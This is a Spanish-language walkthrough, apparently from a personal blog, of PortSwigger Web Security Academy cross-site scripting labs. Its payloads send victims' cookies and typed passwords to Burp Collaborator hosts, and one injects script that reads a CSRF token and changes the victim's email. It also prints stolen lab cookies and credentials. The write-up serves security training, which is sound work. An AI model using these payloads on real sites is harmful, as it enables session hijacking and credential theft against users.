---
layout: default
title: "Cross-site scripting - PortSwigger"
permalink: /xss-ps/
---

# Cross-site scripting - PortSwigger

Todos los laboratorios posteriormente expuestos los puedes encontrar para resolverlos en el siguiente link.

[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

## Índice



## 1. Lab: Reflected XSS into HTML context with nothing encoded

```
Este laboratorio contiene una vulnerabilidad XSS reflejada simple en la función de búsqueda.

Para resolver el laboratorio, realice un ataque XSS que llame a la función alert.
```

Payload

```
https://acc21f861f22e8c880220b6c0070003c.web-security-academy.net/?search=<script>alert(1)</script>
```

![](img1.png)

## 2. Lab: Exploiting cross-site scripting to steal cookies

```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
```

Para este laboratorio vamos a ingresar a un post y realizar un comentario mientras interceptamos todos los paquetes en segundo plano mediante la herramienta de burpsuite. Luego lo enviamos al repeater y preparamos nuestro payload.

```
<script>document.location='http://lti3h8huag0tmmzul0n2ujpz0q6gu5.burpcollaborator.net/?'+document.cookie</script>
```

Entonces lo enviamos en el repeater, y esperamos la respuesta en el burp collaborator.

![](img2.png)

Entonces, la cookie robada es la siguiente:

```
secret=avJbuCyJJiBnI7NFZJ4sbbdOXdKAb4Py; session=4TWOZsQYlS5PASECvxhQPUONxdZ5qi6l
```

Entonces ingresamos al home del laboratorio, interceptamos el paquete y cambiamos la cookie para completar el laboratorio.

![](img3.png)

## 3. Lab: Exploiting cross-site scripting to capture passwords

```
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
```

Entonces primero iremos a la seccion de login para recoger las dos etiquetas input de usuario y contraseña.

```
<input required="" type="username" name="username">
<input required="" type="password" name="password">
```

Y para obtener el valor dentro de estos input podemos usar el payload:

```
document.getElementsByName("username")[0].value
document.getElementsByName("password")[0].value
```

Entonces, creamos nuestro payload.

```html
<input required="" type="username" name="username"><input required="" type="password" name="password"><script>document.location='http://9s2dl5quximg9tsq7m5m5gvfj6pwdl.burpcollaborator.net/?'+document.getElementsByName("username")[0].value+'&'+document.getElementsByName("password")[0].value</script>
```

Entonces, iniciamos el modo **Intercept ON** del burpsuite, y cambiamos el valor del mensaje por el payload, encodeado con URL encode.

![](img5.png)

Podemos ver que envia el paquete

![](img6.png)

Pero lo envia sin informacion, esto puede ocurrir porque a la hora de realizar el document.location todavia no se realizó el autocompletado, por ello haremos uso del atributo **onchange**. 

```html
<input required="" type="username" name="username"><input required="" type="password" name="password" onchange="document.location='http://9s2dl5quximg9tsq7m5m5gvfj6pwdl.burpcollaborator.net/?'+document.getElementsByName('username')[0].value+'&'+document.getElementsByName('password')[0].value">
```

![](img7.png)

Entonces, verificamos el **burp collaborator** y obtenemos las credenciales.

![](img8.png)

```
administrator:ef6gbovly0a77qvxul8i
```

Entonces, nos logeamos con las credenciales y completamos el laboratorio.

![](img9.png)

## 4. Lab: Exploiting XSS to perform CSRF

```
This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
```

Antes de todo necesitamos entender como funciona el cambio de contraaeña, así que cambiaremos la contraseña de nuestra cuenta **wiener** para conocer los parametros y la ruta a donde se debe enviar.

```
POST /email/change-email HTTP/1.1
Host: ac411fe71f8b856f80352cd100b300fe.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: https://ac411fe71f8b856f80352cd100b300fe.web-security-academy.net
DNT: 1
Connection: close
Referer: https://ac411fe71f8b856f80352cd100b300fe.web-security-academy.net/email
Cookie: session=aFgfuzayL8jK1xA5jr3j6Z1fQvH6Kbsv
Upgrade-Insecure-Requests: 1

email=a%40a.a&csrf=6f8A1jOKIzioIeAGRZayu2KCRH2q0mTf
```

Entonces, realizaremos un payload XSS con los parametros del paquete anterior:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=a@a.a')
};
</script>
```

Entonces lo enviamos por comentario y terminamos el laboratorio.

![](img10.png)

## 5. Lab: Stored XSS into HTML context with nothing encoded

```
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed
```

Payload

```html
<script>alert(1)</script>
```

![](img11.png)

![](img12.png)

## 6. Lab: Reflected XSS into HTML context with most tags and attributes blocked





